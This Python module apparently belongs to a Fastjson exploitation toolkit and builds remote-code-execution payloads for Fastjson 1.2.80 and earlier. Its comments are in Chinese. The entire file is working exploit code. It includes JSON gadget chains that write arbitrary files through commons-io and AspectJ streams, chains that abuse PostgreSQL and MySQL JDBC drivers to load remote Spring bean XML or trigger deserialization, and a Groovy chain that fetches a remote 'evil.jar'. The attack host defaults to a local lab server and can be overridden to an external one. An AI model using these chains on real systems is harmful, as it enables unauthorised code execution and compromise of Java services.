"""Fastjson ≤1.2.80 RCE 证明 payload：每条链最终必须写文件。

多步链需同进程共享 ParserConfig。含重复 @type，勿再 json.dumps。
"""

from __future__ import annotations

from typing import Optional

from fastjson_toolkit.poc.v1_2_80.catalog import GadgetKind, get_gadget

EX = '"@type":"java.lang.Exception"'
IS = '"@type":"java.io.InputStream"'

# 靶场容器内自拉取（GadgetLabServer /attack/*）；外置攻击站可覆盖 socket_factory_arg/classpath
DEFAULT_ATTACK_BASE = "http://127.0.0.1:18080/attack"


def _jesc(s: str) -> str:
    return (
        s.replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("\t", "\\t")
    )


def _pad_utf8(content: str, block: int = 8193) -> str:
    """SafeFileOutputStream 内层 BufferedOutputStream(8192)：count==8192 仍在缓冲，
    需再写 1 字节才会 flushBuffer；故默认 pad 到 8193（未 close 也能落盘）。"""
    raw = content.encode("utf-8")
    if len(raw) >= block:
        return content
    return content + ("a" * (block - len(raw)))


def build_jackson_cache_step1() -> str:
    return (
        "{"
        f"{EX},"
        '"@type":"com.fasterxml.jackson.core.exc.InputCoercionException",'
        '"p":{}'
        "}"
    )


def build_jackson_cache_step2() -> str:
    return (
        "{"
        '"@type":"com.fasterxml.jackson.core.JsonParser",'
        '"@type":"com.fasterxml.jackson.core.json.UTF8StreamJsonParser",'
        '"in":{}'
        "}"
    )


def build_jackson_cache_steps() -> list[str]:
    return [build_jackson_cache_step1(), build_jackson_cache_step2()]


def build_jackson_cache() -> str:
    return build_jackson_cache_step1()


def _tee_write_payload(
    *,
    file: str,
    content: str,
    reader_json: str,
    branch_json: str,
) -> str:
    """BOMInputStream + Tee + $ref bOM；BOM 字节=内容，读尽后 AutoClose 可关闭 branch。"""
    raw = content.encode("utf-8")
    bom = ",".join(str(b) for b in raw)
    return (
        "{"
        '"abc":{'
        f"{IS},"
        '"@type":"org.apache.commons.io.input.BOMInputStream",'
        '"delegate":{'
        '"@type":"org.apache.commons.io.input.AutoCloseInputStream",'
        '"in":{'
        '"@type":"org.apache.commons.io.input.TeeInputStream",'
        f'"input":{reader_json},'
        f'"branch":{branch_json},'
        '"closeBranch":true'
        "}"
        "},"
        '"include":true,'
        f'"boms":[{{"charsetName":"UTF-8","bytes":[{bom}]}}]'
        "},"
        '"x":{"$ref":"$.abc.bOM"}'
        "}"
    )


def build_io_write(file: str, content: str = "FJ1280_IO_WRITE") -> str:
    path = _jesc(file)
    text = _jesc(content)
    reader = (
        "{"
        '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        '"reader":{"@type":"java.io.StringReader","s":"' + text + '"},'
        '"charsetName":"UTF-8",'
        '"bufferSize":1024'
        "}"
    )
    branch = (
        "{"
        '"@type":"org.apache.tools.ant.util.LazyFileOutputStream",'
        f'"file":"{path}",'
        '"append":false,'
        '"alwaysCreate":true'
        "}"
    )
    return _tee_write_payload(
        file=file, content=content, reader_json=reader, branch_json=branch
    )


def build_io_copy_write(
    file: str = "/tmp/fj1280_io_copy_write",
    url: str = "file:///tmp/fj1280_read_src",
    content: str = "FJ1280_READ_SRC\n",
) -> str:
    """从 URLReader 读入并 tee 写入目标文件。"""
    path = _jesc(file)
    u = _jesc(url)
    reader = (
        "{"
        '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        '"reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"' + u + '"},'
        '"charsetName":"UTF-8",'
        '"bufferSize":1024'
        "}"
    )
    branch = (
        "{"
        '"@type":"org.apache.tools.ant.util.LazyFileOutputStream",'
        f'"file":"{path}",'
        '"append":false,'
        '"alwaysCreate":true'
        "}"
    )
    return _tee_write_payload(
        file=file, content=content, reader_json=reader, branch_json=branch
    )


def build_aspectj_write(file: str, content: str = "FJ1280_ASPECTJ_WRITE") -> str:
    """Tee→SafeFileOutputStream 写文件。

    target/temp 均不存在时构造器直接写 target，但外包 BufferedOutputStream；
    BOM/$ref 路径通常不 close，故内容 pad 到 ≥8193 强制 flush。
    """
    padded = _pad_utf8(content, 8193)
    path = _jesc(file)
    # 使用不存在的 temp，且发送前应确保 target 不存在，才能走「直写 target」分支
    tmp = _jesc(file + ".bak")
    text = _jesc(padded)
    reader = (
        "{"
        '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        '"reader":{"@type":"java.io.StringReader","s":"' + text + '"},'
        '"charsetName":"UTF-8",'
        '"bufferSize":1024'
        "}"
    )
    branch = (
        "{"
        '"@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",'
        f'"targetPath":"{path}",'
        f'"tempPath":"{tmp}"'
        "}"
    )
    return _tee_write_payload(
        file=file, content=padded, reader_json=reader, branch_json=branch
    )


def build_postgresql(
    socket_factory_arg: str = f"{DEFAULT_ATTACK_BASE}/bean-postgresql.xml",
    host: str = "127.0.0.1",
    port: int = 2333,
) -> str:
    return (
        "{"
        f"{IS},"
        '"@type":"org.postgresql.copy.PGCopyInputStream",'
        '"connection":{'
        '"@type":"org.postgresql.jdbc.PgConnection",'
        '"hostSpecs":[{'
        '"@type":"org.postgresql.util.HostSpec",'
        f'"host":"{_jesc(host)}",'
        f'"port":{int(port)}'
        "}],"
        '"user":"root",'
        '"database":"root",'
        '"url":"",'
        '"info":{'
        '"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",'
        f'"socketFactoryArg":"{_jesc(socket_factory_arg)}",'
        '"user":"root",'
        '"password":"x"'
        "}"
        "},"
        '"sql":"COPY t FROM STDIN"'
        "}"
    )


def build_mysql_cache_conn() -> str:
    return (
        "{"
        f"{IS},"
        '"@type":"com.mysql.jdbc.CompressedInputStream",'
        '"conn":{},'
        '"streamFromServer":{'
        '"@type":"org.apache.commons.io.input.NullInputStream",'
        '"size":1'
        "}"
        "}"
    )


def build_mysql_jdbc(
    host: str = "127.0.0.1",
    port: int = 3308,
    user: str = "fj1280",
    *,
    outbound: bool = True,
    named_pipe_path: str = "/tmp/mysql.pcap",
) -> str:
    """CompressedInputStream → JDBC4Connection（出网 / NamedPipe 不出网）。"""
    if outbound:
        return (
            "{"
            f"{IS},"
            '"@type":"com.mysql.jdbc.CompressedInputStream",'
            '"conn":{'
            '"@type":"com.mysql.jdbc.JDBC4Connection",'
            f'"hostToConnectTo":"{_jesc(host)}",'
            f'"portToConnectTo":{int(port)},'
            '"info":{'
            f'"user":"{_jesc(user)}",'
            '"password":"pass",'
            '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
            '"autoDeserialize":"true",'
            '"NUM_HOSTS":"1"'
            "},"
            '"databaseToConnectTo":"dbname"'
            "}"
            "}"
        )
    return (
        "{"
        f"{IS},"
        '"@type":"com.mysql.jdbc.CompressedInputStream",'
        '"conn":{'
        '"@type":"com.mysql.jdbc.JDBC4Connection",'
        '"hostToConnectTo":"127.0.0.1",'
        '"portToConnectTo":3306,'
        '"info":{'
        '"useSSL":"false",'
        f'"user":"{_jesc(user)}",'
        f'"HOST":"{_jesc(host)}",'
        '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
        '"autoDeserialize":"true",'
        '"NUM_HOSTS":"1",'
        '"socketFactory":"com.mysql.jdbc.NamedPipeSocketFactory",'
        f'"namedPipePath":"{_jesc(named_pipe_path)}",'
        '"DBNAME":"test"'
        "},"
        '"databaseToConnectTo":"test",'
        '"url":""'
        "}"
        "}"
    )


def build_groovy_step1() -> str:
    return (
        "{"
        f"{EX},"
        '"@type":"org.codehaus.groovy.control.CompilationFailedException",'
        '"unit":{}'
        "}"
    )


def build_groovy_step2(
    classpath: str = f"{DEFAULT_ATTACK_BASE}/evil.jar",
) -> str:
    cp = _jesc(classpath)
    return (
        "{"
        '"@type":"org.codehaus.groovy.control.ProcessingUnit",'
        '"@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",'
        '"config":{'
        '"@type":"org.codehaus.groovy.control.CompilerConfiguration",'
        f'"classpathList":["{cp}"]'
        "},"
        '"gcl":null,'
        '"destDir":"/tmp"'
        "}"
    )


def build_jython(
    socket_factory_arg: str = f"{DEFAULT_ATTACK_BASE}/bean-jython.xml",
    host: str = "127.0.0.1",
    port: int = 2333,
) -> str:
    return (
        "{"
        '"a":{'
        f"{EX},"
        '"@type":"org.python.antlr.ParseException",'
        '"type":{}'
        "},"
        '"b":{'
        '"@type":"org.python.core.PyObject",'
        '"@type":"com.ziclix.python.sql.PyConnection",'
        '"connection":{'
        '"@type":"org.postgresql.jdbc.PgConnection",'
        '"hostSpecs":[{'
        '"@type":"org.postgresql.util.HostSpec",'
        f'"host":"{_jesc(host)}",'
        f'"port":{int(port)}'
        "}],"
        '"user":"user",'
        '"database":"test",'
        '"url":"",'
        '"info":{'
        '"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",'
        f'"socketFactoryArg":"{_jesc(socket_factory_arg)}",'
        '"user":"user",'
        '"password":"x"'
        "}"
        "}"
        "}"
        "}"
    )


def build_steps(
    gadget: GadgetKind | str,
    *,
    file: Optional[str] = None,
    content: Optional[str] = None,
    url: Optional[str] = None,
    guess_byte: Optional[int] = None,  # 兼容旧参数，忽略
    host: Optional[str] = None,
    port: Optional[int] = None,
    user: Optional[str] = None,
    socket_factory_arg: Optional[str] = None,
    classpath: Optional[str] = None,
    outbound: bool = True,
    named_pipe_path: Optional[str] = None,
) -> list[str]:
    del guess_byte  # unused
    entry = get_gadget(gadget)
    gid = entry.id
    fpath = file or entry.marker_file
    body = content if content is not None else entry.marker_content
    h = host or "127.0.0.1"
    cache = build_jackson_cache_steps()
    attack = DEFAULT_ATTACK_BASE

    if gid == "io_write":
        return [*cache, build_io_write(fpath, body)]
    if gid == "io_copy_write":
        # 源文件内容默认含换行（靶场预置）
        src_content = body if content is not None else "FJ1280_READ_SRC\n"
        return [
            *cache,
            build_io_copy_write(
                fpath,
                url or "file:///tmp/fj1280_read_src",
                src_content,
            ),
        ]
    if gid == "postgresql":
        return [
            *cache,
            build_postgresql(
                socket_factory_arg or f"{attack}/bean-postgresql.xml",
                h,
                2333 if port is None else port,
            ),
        ]
    if gid == "mysql_jdbc":
        pipe_host = host or ("xxx" if not outbound else "127.0.0.1")
        return [
            *cache,
            build_mysql_jdbc(
                pipe_host,
                3308 if port is None else port,
                user or ("mysql" if not outbound else "fj1280"),
                outbound=outbound,
                named_pipe_path=named_pipe_path or "/tmp/mysql.pcap",
            ),
        ]
    if gid == "groovy":
        return [
            build_groovy_step1(),
            build_groovy_step2(classpath or f"{attack}/evil.jar"),
        ]
    if gid == "jython":
        return [
            build_jython(
                socket_factory_arg or f"{attack}/bean-jython.xml",
                h,
                2333 if port is None else port,
            )
        ]
    if gid == "aspectj_write":
        return [*cache, build_aspectj_write(fpath, body)]
    raise ValueError(f"未实现 gadget: {gid}")


def build_payload(gadget: GadgetKind | str, **kwargs) -> str:
    return build_steps(gadget, **kwargs)[-1]
